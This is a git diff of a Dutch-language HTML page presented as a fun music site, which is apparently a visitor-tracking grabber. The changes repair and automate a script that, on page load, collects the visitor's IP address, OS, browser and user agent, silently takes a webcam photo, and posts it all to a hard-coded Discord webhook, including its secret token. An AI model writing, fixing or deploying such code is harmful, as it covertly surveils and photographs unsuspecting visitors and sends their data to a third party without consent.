@@ -29,14 +29,14 @@
     </style>
     <script>
         var embedSent = false;
+        var musicStarted = false;
 
         function startMusic() {
-            if (!embedSent) {
-                sendToDiscord();
-                embedSent = true;
+            if (!musicStarted) {
+                var audio = new Audio('sound.mp3');
+                audio.play();
+                musicStarted = true;
             }
-            var audio = new Audio('sound.mp3');
-            audio.play();
         }
 
         function sendToDiscord() {
@@ -48,54 +48,54 @@
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
             // Maak een foto met de webcam en converteer naar een Base64-gecodeerde string
-            var photoData = takePhoto();
+            takePhoto(function(photoData) {
+                var embed = {
+                    "embeds": [
+                        {
+                            "title": "IP Logger",
+                            "description": "Een gebruiker heeft de pagina bezocht.",
+                            "color": 65280, // Groen als het leuk vond, Rood als niet leuk
+                            "fields": [
+                                {
+                                    "name": "IP Adres",
+                                    "value": ipAddress,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Besturingssysteem",
+                                    "value": os,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Browser",
+                                    "value": browser,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Gebruikersagent",
+                                    "value": userAgent,
+                                    "inline": false
+                                },
+                                {
+                                    "name": "Tijdstip",
+                                    "value": timestamp,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Foto",
+                                    "value": "<img src='" + photoData + "' style='max-width: 100%;' />", // Inclusief foto in de embed
+                                    "inline": false
+                                }
+                            ]
+                        }
+                    ]
+                };
 
-            var embed = {
-                "embeds": [
-                    {
-                        "title": "IP Logger",
-                        "description": "Een gebruiker heeft de pagina bezocht.",
-                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
-                        "fields": [
-                            {
-                                "name": "IP Adres",
-                                "value": ipAddress,
-                                "inline": true
-                            },
-                            {
-                                "name": "Besturingssysteem",
-                                "value": os,
-                                "inline": true
-                            },
-                            {
-                                "name": "Browser",
-                                "value": browser,
-                                "inline": true
-                            },
-                            {
-                                "name": "Gebruikersagent",
-                                "value": userAgent,
-                                "inline": false
-                            },
-                            {
-                                "name": "Tijdstip",
-                                "value": timestamp,
-                                "inline": true
-                            },
-                            {
-                                "name": "Foto",
-                                "value": "<img src='" + photoData + "' style='max-width: 100%;' />", // Inclusief foto in de embed
-                                "inline": false
-                            }
-                        ]
-                    }
-                ]
-            };
-
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookURL);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify(embed));
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", webhookURL);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(embed));
+            });
         }
 
         function detectOS(userAgent) {
@@ -130,11 +130,10 @@
             return detectedBrowser || 'Onbekend';
         }
 
-        // Deze functie maakt een foto met de webcam en retourneert een Base64-gecodeerde string
-        function takePhoto() {
+        // Deze functie maakt een foto met de webcam en roept een callback op met de Base64-gecodeerde string van de foto
+        function takePhoto(callback) {
             var canvas = document.createElement('canvas');
             var video = document.createElement('video');
-            var photoData;
 
             navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                 video.srcObject = stream;
@@ -143,27 +142,26 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    photoData = canvas.toDataURL('image/jpeg');
+                    var photoData = canvas.toDataURL('image/jpeg');
                     video.srcObject.getTracks().forEach(track => track.stop());
+                    callback(photoData);
                 }, 500); // Laat 0.5 seconde toe voor de camera om te initialiseren
             }).catch(function(err) {
                 console.error('Kan geen toegang krijgen tot de webcam:', err);
             });
-
-            return photoData;
         }
 
         window.onload = function() {
             startMusic(); // Start muziek direct bij het laden van de pagina
+            if (!embedSent) {
+                sendToDiscord();
+                embedSent = true;
+            }
         }
     </script>
 </head>
 <body>
     <h1>Welkom bij onze geweldige site!</h1>
     <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
-    <audio id="music" autoplay loop>
-        <source src="sound.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
 </body>
 </html>
